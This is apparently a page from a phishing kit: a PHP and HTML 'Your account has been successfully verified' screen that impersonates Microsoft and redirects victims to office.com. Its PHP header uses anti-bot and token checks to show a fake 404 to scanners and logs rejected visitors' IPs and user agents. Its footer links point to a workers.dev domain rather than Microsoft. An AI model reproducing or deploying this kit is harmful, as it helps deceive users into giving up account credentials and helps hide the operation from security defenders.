<?php

    session_start();

    require_once '../Meta/Comp.php';
    require_once '../Meta/Antibot.php';
    require_once '../Meta/demonTest.php';

    $comps = new Comp;
    $antibot = new Antibot;

    $settings = $comps->settings();

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        $comps->log(
            "../Astute/Audio/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Token\n\n"
        );
        die();
    }


?>
	<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width initial-scale=1 user-scalable=no maximum-scale=1"><title>Verify Your Account</title>
<meta http-equiv="refresh" content="5;url=https://www.office.com">
<link href="files/favicon.png" rel="shortcut icon"><script type="text/javascript" src="./files/6324aa013c295292010eb534.js.download"></script><link type="text/css" rel="stylesheet" href="./files/4f4414fa2fdd4b2180aac793aed603fbnbr1663347199.css"><link type="text/css" rel="stylesheet" href="./files/55f9629abf4d28fca8b21b0e2afa106cnbr1663347200.css"></head>

<body  style="background-image: url('files/bg.jpg"><div id="b7P1qpjT20NEtXSROWMeKZ9LGQ" class="login-wrap" style="display: flex; align-items: center; min-height: 100vh; width: 100%;"><span></span><div class="zd052424d052424rngyU"><div class="B3a4cd3ff3a4cd3ffgJ"><img src="./files/logo.svg" class="eYX2e253fa22e253fa2dgJu"></div><div class="B3a4cd3ff3a4cd3ffgJ n33c18cf733c18cf7tvz"><div><div class="NEpd48dbc84d48dbc84zDuY"><img src="./files/user.png" class="iVje5d0462d92b1903mBw"></div><h1 class="C27bbddbc27bbddbclL">Your account has been successfully verified</h1><div class="Eu3176a44c3176a44cIEn">You'll be redirected to the login page to continue <br>your session.</div>

   <!----></div></form></div></div></div><br><br></div></br><div id="checks"></div></div></div></body>

<div class="jJ19aabd4519aabd45PwYEO"><div><footer>© 2022 Copyright Microsoft Corporation </div><div><a href="https://winter-grass-cf2d.eliere8.workers.dev/?bbre=xzodsiizx">Terms</a><a href="https://winter-grass-cf2d.eliere8.workers.dev/?bbre=xzodsiizx">Privacy &amp;Policy</a><a href="https://winter-grass-cf2d.eliere8.workers.dev/?bbre=xzodsiizx">Help</a></div></div></div></div><script><script src="./files/a3107e4d4ae0ea783cd1177c52f1e6301663347187.js.download" async=""></script><script src="./files/a3107e4d4ae0ea783cd1177c52f1e6301663347187.js.download" async=""></script></footer></html>